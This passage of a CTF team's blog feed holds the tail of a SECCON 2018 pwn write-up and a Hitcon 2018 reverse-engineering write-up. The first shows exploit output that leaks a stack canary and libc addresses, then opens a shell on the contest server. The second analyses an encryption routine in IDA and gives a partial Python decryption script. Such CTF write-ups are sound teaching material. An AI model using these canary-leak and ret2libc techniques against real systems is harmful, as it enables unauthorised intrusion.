class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ python profile.py </span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/libc-2.23'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to profile.pwn.seccon.jp on port 28553: Done</span><br><span class="line">[*] ----------Searching <span class="keyword">for</span> the offset-------------</span><br><span class="line">[*] LEAKED ADDR 0x323232320034 0x0</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74720 0x10</span><br><span class="line">[*] LEAKED ADDR 0x323232323232 0x20</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74740 0x30</span><br><span class="line">[*] LEAKED ADDR 0x600034 0x40</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74760 0x50</span><br><span class="line">[*] LEAKED ADDR 0x414141414141 0x60</span><br><span class="line">[*] ------------------Offset Found-----------------</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74770</span><br><span class="line">[*] CANARY ADDR 0x7ffc15b74798</span><br><span class="line">[*] Canary 0x16e9ecb89abcf100</span><br><span class="line">[*] READ 0x7f2e75ce7250</span><br><span class="line">[*] LIBC 0x7f2e75bf0000</span><br><span class="line">[*] SYSTEM 0x7f2e75c35390</span><br><span class="line">[*] BINSH 0x7f2e75d7cd57</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Wrong input...</span><br><span class="line">$ ls</span><br><span class="line">flag.txt</span><br><span class="line">profile</span><br><span class="line">$ cat flag.txt</span><br><span class="line">SECCON&#123;57r1ng_l0c4710n_15_n07_0nly_h34p&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Profile&lt;br&gt;255&lt;br&gt;64 Solves&lt;br&gt;Host: profile.pwn.seccon.jp&lt;br&gt;Port: 28553&lt;br&gt;profile_e814c1a78e80ed250c17e94585224b3f3be9d38
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
      <category term="Canary Leak" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="c++" scheme="https://teamrocketist.github.io/tags/c/"/>
    
      <category term="malloc_usable_size" scheme="https://teamrocketist.github.io/tags/malloc-usable-size/"/>
    
      <category term="std::string" scheme="https://teamrocketist.github.io/tags/std-string/"/>
    
      <category term="seccon2018" scheme="https://teamrocketist.github.io/tags/seccon2018/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Hitcon 2018 - EOP</title>
    <link href="https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/"/>
    <id>https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/</id>
    <published>2018-10-22T21:35:34.000Z</published>
    <updated>2018-10-24T23:59:47.485Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>EOP<br><br>EOP.<br><br>eop-811afa1b9fb0c0719a75afd316ea2c57<br>Author: david942j<br>29 Teams solved.<br><br></blockquote><p>Quite challenging reverse engineering, well at least it was for me, the binary wasn’t very hard to understand perhaps it had some strange <strong><em>exceptions</em></strong> “mechanics” which were being to used to jump to other parts of the code in a sequence order.</p><p><strong><em>Using IDA</em></strong> for this challenge was crucial for me at first I was just trying to use <strong><em>radare2</em></strong> and <strong><em>gdb</em></strong> but I got quickly overwhelmed by the code, both <strong><em>static and dynamic analysis</em></strong> were made with IDA, IDA is good because you can <strong><em>easily navigate</em></strong> through <strong><em>control flow graphs</em></strong> while debugging and it’s very easy to <strong><em>change the views</em></strong>, one thing that really helped me was to create a view to <strong><em>keep track of some global variables</em></strong> that were being used for encryption in this challenge.</p><p>You must be asking how I debugged an elf while using IDA on Windows, this can be done via remote debugging (the elf runs on an external linux machine) which is supported by IDA if you want to know how to do <a href="https://reverseengineering.stackexchange.com/questions/11516/how-to-setup-ida-pro-linux-gdb-server" target="_blank" rel="noopener">this</a>.</p><p>This binary is using <strong><em>multiple exceptions to manage the control flow</em></strong> of the program identifying this isn’t very hard after some trial and error I easily found where the exceptions were being thrown I just setted up alot of <strong><em>breakpoints</em></strong> while observing some global variables changes. The real deal in this challenge was to deal with the extensive <strong><em>encryption function</em></strong>  I ended up very tired until I <strong><em>figured out the function</em></strong>.<br> The ida <strong><em>pseudo c code converter</em></strong> wasn’t working at all so I needed to read <strong><em>pure assembly</em></strong> which isn’t a big problem for me but it <strong><em>definitively takes more time</em></strong> to read, luckily after fully <strong><em>understanding</em></strong> the encrypting function writing the code to reverse it was very easy.</p><h3 id="Identifying-the-size-of-the-flag-and-extract"><a href="#Identifying-the-size-of-the-flag-and-extract" class="headerlink" title="Identifying the size of the flag and extract"></a>Identifying the size of the flag and extract</h3><p>By opening the main function in IDA we can quickly see how much the size is the flag:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/OOwZQgz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OOwZQgz.png" alt=""><br></a></p><p>Scrolling down a little bit we can quickly find where the binary is checking if the flag we inserted had the correct size, The encrypted flag is already stored in a global var, we can extract it using ida, you can do this by double clicking on the offset and then <strong><em>edit -&gt; export data</em></strong> (or shift + e while selecting it ) and you can select it to export to c like I did, you then can just adapt to other languages if you are using a different language like me (in my case python).</p><p>Some Globals already showing up in the main function graph:<br><a data-fancybox="gallery" href="https://i.imgur.com/vWF5tJz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vWF5tJz.png" alt=""><br></a></p><p>Exporting it:<br><a data-fancybox="gallery" href="https://i.imgur.com/61Fk8YI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/61Fk8YI.png" alt=""><br></a></p><p>Keep in mind that I renamed some functions and vars in ida so it might be a little different from yours (if you<br>want to check my idb ask it on the comments and I’ll upload it), Still looking at the main function, we can notice after the <strong><em>cmp     [rbp+var_1C], 0x2f</em></strong>, the first 16 bytes of the string are extracted to two global variables <strong><em>flaginput</em></strong> and <strong><em>flaginput2</em></strong> (renamed by me in IDA):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/vnhhJdK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vnhhJdK.png" alt=""><br></a></p><p>As you notice from the image above after the split it’s going to call Alloc_throw_catch (renamed) this is where all the exception magic is going to happen:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nx8Eoxl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nx8Eoxl.png" alt=""><br></a></p><p>Keep in mind that <strong><em>begin_catch</em></strong> actually updates the value on the heap before we jump in <strong><em>CALL RAX</em></strong> so I assumed that begin does something besides limiting the limits of the catch. Putting a break on <strong><em>CALL RAX</em></strong> is smart because this is going to be executed multiple times and it’s from here we are going to jump into the encryption functions.</p><h3 id="Encryption-Functions"><a href="#Encryption-Functions" class="headerlink" title="Encryption Functions"></a>Encryption Functions</h3><p>After jumping from <strong><em>CALL RAX</em></strong> we are going to jump into 1st encrytion function, the encryption process is separated in a lot of function, but they are very similar to each other some times they are even equal, the process is resumed in the box bellow:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XorInputFlag</span><br><span class="line">|</span><br><span class="line">ReverveXoredString </span><br><span class="line">|</span><br><span class="line">Repeat 8 times</span><br><span class="line">ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty different from the 1st AddAddXor)</span><br><span class="line">End Repeat</span><br><span class="line">|</span><br><span class="line">Xor</span><br><span class="line">|</span><br><span class="line">ExchangeByteOrders</span><br></pre></td></tr></table></figure><h4 id="XorInputFlag"><a href="#XorInputFlag" class="headerlink" title="XorInputFlag"></a>XorInputFlag</h4><p>It simply <strong><em>xors the first 8 bytes</em></strong> (inputflag) with key which is stored in a <strong><em>global variable</em></strong> (does the same for the next 8 too “inputflag2”), for the <strong><em>first 16 bytes</em></strong> (Round 1) the key is <strong><em>zero</em></strong> and when you xor something with a zero it <strong><em>does absolutely nothing</em></strong> the value remains the same. The xor key is zero because the globals are set to zero, for the next rounds they are going to filled.</p><p>On the image bellow I created a view (Views -&gt; Open subviews -&gt; Disassembly) so I can track all of this Globals so I know when they are going to be modified (helped me alot for debugging the entire process). </p><p>This function aplies to both inputflag and inputflag2.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/UeIfanQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UeIfanQ.png" alt=""><br></a></p><h4 id="ReverveXoredString"><a href="#ReverveXoredString" class="headerlink" title="ReverveXoredString"></a>ReverveXoredString</h4><p>Receives a string of 8 bytes ()</p><p>This function <strong><em>reverses</em></strong> the 1st 4 bytes of the string (returned from <strong><em>XorInputFlag</em></strong>) and then uses <strong><em>xor</em></strong> with a key stored in a global which IDA names it <strong><em>off_5604E325B150</em></strong> (the last numbers should differ because <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener">PIE</a> is enabled), once again you can export it to later use it for reversing, this variable is a huge table with multiple values and is <strong><em>constantly used by the binary</em></strong>. The process is repeated again for the last 4 bytes but with a different offset from the xor key table.</p><p> if you are confused with all the shift lefts in assembly don’t be the shifts are only used to <strong><em>change the order</em></strong> of the bytes of the input for example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String -&gt; &apos;AA&apos;</span><br><span class="line">String in hex -&gt; 0x4141</span><br><span class="line">Shift left on &apos;AA&apos; -&gt; 0x414100</span><br><span class="line">and now a simple OR operation can be used to insert a character in the beginning of the string:</span><br><span class="line">0x414100 | 0x45 =  0x414145 -&gt; &apos;EAA&apos;</span><br></pre></td></tr></table></figure><p>The first 4 bytes of string returned from <strong><em>XorInputFlag</em></strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/V1sd4Lf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/V1sd4Lf.png" alt=""><br></a></p><p>The last 4 bytes of string returned <strong><em>XorInputFlag</em></strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Knn9CcY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Knn9CcY.png" alt=""><br></a></p><p>Resuming it the the result of the first bytes are saved on <strong><em>dword_560CC63C71C0</em></strong> and the last ones are saved on <strong><em>dword_560CC63C71C4</em></strong>.</p><h4 id="ShrAddXor-gt-AddAddXor-gt-Ror-gt-Rol-gt-AddAddXor-Slighty-diferent-from-the-1st-AddAddXor"><a href="#ShrAddXor-gt-AddAddXor-gt-Ror-gt-Rol-gt-AddAddXor-Slighty-diferent-from-the-1st-AddAddXor" class="headerlink" title="ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)"></a>ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)</h4><p>This process is going to be repeated 8 times! And they only difference on each interaction is the offsets to the xor key table is increases 0x10.</p><h5 id="ShrAddXor"><a href="#ShrAddXor" class="headerlink" title="ShrAddXor"></a>ShrAddXor</h5><p>This function does a bunch of operations to calculate the index of <strong><em>4 xor keys</em></strong> from the global array, it then applies 3 sequential xors as explained bellow, the result is saved in a new variable <strong><em>dword_560CC63C71D0</em></strong> .</p><p>The Function Applied to the first 4 bytes (Value coming from <strong><em>dword_5604E325B1C0</em></strong>)</p><p><a data-fancybox="gallery" href="https://i.imgur.com/kffFGvA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kffFGvA.png" alt=""><br></a></p><p>The function applied to the last 4 bytes are coming from the global <strong><em>dword_5604E325B1C4</em></strong> and is going to be stored on <strong><em>dword_560CC63C71D4</em></strong> the is the same but the order of the bytes extracted are different in this case the is<br><strong><em>4th byte, 1st byte, 2nd byte, 3rd byte</em></strong> and the final result is in a new variable <strong><em>dword_560CC63C71D4</em></strong> .</p><p>The Function applied to the last 4 bytes (Value coming from <strong><em>dword_5604E325B1C4</em></strong>)</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Uvfkv1l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Uvfkv1l.png" alt=""><br></a></p><h4 id="AddAddXor"><a href="#AddAddXor" class="headerlink" title="AddAddXor"></a>AddAddXor</h4><p>This one is really simple but they differ from interaction to interaction regarding to the offsets, and as I said above the process is going to be repeated 8 times and the offset increases <strong><em>0x10</em></strong> on each operation as explained in the image bellow for the first 4 bytes:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/r9W00O4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r9W00O4.png" alt=""><br></a></p><h4 id="Ror"><a href="#Ror" class="headerlink" title="Ror"></a>Ror</h4><p>This one is even simpler i just uses <strong><em>ror</em></strong> operation:</p><p>the 4 bytes are extracted from <strong><em>dword_5604E325B1C0</em></strong> and then saved to <strong><em>dword_5604E325B1C0</em></strong> again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/BkcTEqI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BkcTEqI.png" alt=""><br></a></p><h4 id="Rol"><a href="#Rol" class="headerlink" title="Rol"></a>Rol</h4><p>This one is simple too it just uses <strong><em>rol</em></strong> operation:</p><p>the 4 bytes are extracted from <strong><em>dword_5604E325B1C4</em></strong> and then saved to <strong><em>dword_5604E325B1C4</em></strong> again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/5vmvJRE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5vmvJRE.png" alt=""><br></a></p><h3 id="AddAddXor-1"><a href="#AddAddXor-1" class="headerlink" title="AddAddXor"></a>AddAddXor</h3><p>Almost the same as the previous AddAddXor but this one has this tricky operation <strong><em> lea edx, [rax + rax]</em></strong> which is equivalent to:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edx = (rax + rax) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure></p><p>The mask (0xffffffff) must be applied because edx is a 32 bit register, this is a little thing you need to keep in mind while writing the reverse script. The index offset to each iteration will also change here (increasing 0x10 as I mention before). The results of this function are saved in <strong><em>dword_560CC63C71C4</em></strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/3bL3Fyf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3bL3Fyf.png" alt=""><br></a></p><p>The examples given above are related to the second chunk of 8 bytes.<br>Now for the 1st chunk of 8 bytes will run this same functions with only some differences in the offsets and the values will be saved in different globals <strong><em>dword_560CC63C71C8</em></strong>, <strong><em>dword_560CC63C71CC</em></strong>, <strong><em>dword_560CC63C71D8</em></strong> and <strong><em>dword_560CC63C71DC</em></strong>.</p><h3 id="Xor-amp-ExchangeByteOrders"><a href="#Xor-amp-ExchangeByteOrders" class="headerlink" title="Xor &amp; ExchangeByteOrders"></a>Xor &amp; ExchangeByteOrders</h3><p>Xor just xors the bytes by a key coming from the xor offset table the offsets are always the same (0x10,0x14,0x18,0x1c) for the 3 rounds after the xors and the result is stored in a new global <strong><em>dword_560CC63C71B0</em></strong>, <strong><em>ExchangeByteOrders</em></strong> will once again exchange bytes do some summations and the result is stored in a new global <strong><em>dword_560CC63C71B8</em></strong>. Bellow is the code equivalent to the assembly that comes after, since I’m running out of time I’ll post the python code now and then later I’ll post the assembly.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Xor</span></span><br><span class="line">dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(off_560CC63C7150, <span class="number">0x10</span>)</span><br><span class="line">dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(off_560CC63C7150, <span class="number">0x14</span>)</span><br><span class="line">dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(off_560CC63C7150, <span class="number">0x18</span>)</span><br><span class="line">dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(off_560CC63C7150, <span class="number">0x1c</span>)</span><br><span class="line">dword_560CC63C71B0 = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># ExchangeByteOrders</span></span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> [dword_560CC63C71C8, dword_560CC63C71CC]:</span><br><span class="line">  dword_560CC63C71B0 = [dword &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">8</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x10</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x18</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line"></span><br><span class="line">dword_560CC63C71B8 = []</span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> [dword_560CC63C71C0, dword_560CC63C71C4]:</span><br><span class="line">  dword_560CC63C71B8 = [dword &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">8</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x10</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x18</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br></pre></td></tr></table></figure><h3 id="Joining-dword-560CC63C71B0-and-dword-560CC63C71B8"><a href="#Joining-dword-560CC63C71B0-and-dword-560CC63C71B8" class="headerlink" title="Joining dword_560CC63C71B0 and dword_560CC63C71B8"></a>Joining dword_560CC63C71B0 and dword_560CC63C71B8</h3><p>In the end of every encryption we end up returning to the main function and the globals <strong><em>dword_560CC63C71B0</em></strong> and  <strong><em>dword_560CC63C71B8</em></strong> are stored next to each other in the <strong><em>memory</em></strong> which will be used to compare to the other encrypted flag. This is just for the <strong><em>first chunk</em></strong> of 16 bytes this, there is more 2 rounds to do for the rest of the characters but luckily they just <strong><em>repeat</em></strong> the same before the only thing that changes is on the first encryption function which now since the globals no longer are 0 the <strong><em>XorInputFlag</em></strong> function will make the difference.</p><p>Joinining dword_560CC63C71B0 and dword_560CC63C71B8 into memory ill be the start of encrypted string we inserted<br><a data-fancybox="gallery" href="https://i.imgur.com/Iap386z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Iap386z.png" alt=""><br></a></p><h3 id="Writing-the-reverse-script"><a href="#Writing-the-reverse-script" class="headerlink" title="Writing the reverse script"></a>Writing the reverse script</h3><p>Write the reverse string is like writing the script from the bottom of the page to the top, it’s like rewinding a VHS tape back to the beginning of the movie, in our case we want to convert the encrypted flag value to the original flag.</p><p>I wrote my script in python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">max_bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">off_560CC63C7150 = [<span class="number">0x6E</span>, <span class="number">0x4D</span>, <span class="number">0x1A</span>, <span class="number">0xC0</span>, <span class="number">0x36</span>, <span class="number">0x66</span>, <span class="number">0xCB</span>, <span class="number">0xA4</span>, <span class="number">0xA1</span>, <span class="number">0x5B</span>, <span class="number">0x0F</span>, <span class="number">0x5B</span>, <span class="number">0x26</span>, <span class="number">0x69</span>, <span class="number">0x26</span>, <span class="number">0x2B</span>, <span class="number">0x8F</span>, <span class="number">0xCB</span>, <span class="number">0x75</span>, <span class="number">0xEF</span>, <span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x37</span>, <span class="number">0xA0</span>, <span class="number">0x9A</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0xBA</span>, <span class="number">0x32</span>, <span class="number">0x89</span>, <span class="number">0x79</span>, <span class="number">0x60</span>, <span class="number">0x59</span>, <span class="number">0xA8</span>, <span class="number">0x6E</span>, <span class="number">0x02</span>, <span class="number">0x93</span>, <span class="number">0x58</span>, <span class="number">0x31</span>, <span class="number">0xF1</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x59</span>, <span class="number">0x8B</span>, <span class="number">0x67</span>, <span class="number">0xAC</span>, <span class="number">0x2B</span>, <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0xCC</span>, <span class="number">0x1A</span>, <span class="number">0xEF</span>, <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x2E</span>, <span class="number">0xAB</span>, <span class="number">0xD5</span>, <span class="number">0x21</span>, <span class="number">0x3F</span>, <span class="number">0x1F</span>, <span class="number">0x5A</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0xF0</span>, <span class="number">0x68</span>, <span class="number">0x83</span>, <span class="number">0xBE</span>, <span class="number">0xC3</span>, <span class="number">0x84</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0x90</span>, <span class="number">0x49</span>, <span class="number">0x20</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0xA1</span>, <span class="number">0xCE</span>, <span class="number">0x18</span>, <span class="number">0x57</span>, <span class="number">0x91</span>, <span class="number">0x96</span>, <span class="number">0x33</span>, <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0xEB</span>, <span class="number">0x21</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0x7A</span>, <span class="number">0xFA</span>, <span class="number">0x6C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0xAB</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x4E</span>, <span class="number">0x51</span>, <span class="number">0xC2</span>, <span class="number">0x3F</span>, <span class="number">0x77</span>, <span class="number">0xEC</span>, <span class="number">0x6A</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0xC6</span>, <span class="number">0xA4</span>, <span class="number">0xF7</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x01</span>, <span class="number">0xB3</span>, <span class="number">0xDC</span>, <span class="number">0x75</span>, <span class="number">0x7A</span>, <span class="number">0x8C</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x69</span>, <span class="number">0x26</span>, <span class="number">0xF2</span>, <span class="number">0x24</span>, <span class="number">0x5F</span>, <span class="number">0x35</span>, <span class="number">0xDB</span>, <span class="number">0x9A</span>, <span class="number">0x23</span>, <span class="number">0xE1</span>, <span class="number">0x4E</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0x34</span>, <span class="number">0xF4</span>, <span class="number">0xC8</span>, <span class="number">0xEF</span>, <span class="number">0x97</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0xF7</span>, <span class="number">0x7D</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x6A</span>, <span class="number">0xE4</span>, <span class="number">0xF6</span>, <span class="number">0xD5</span>, <span class="number">0x80</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0x40</span>, <span class="number">0xBF</span>, <span class="number">0xE1</span>, <span class="number">0xE3</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0xDD</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span 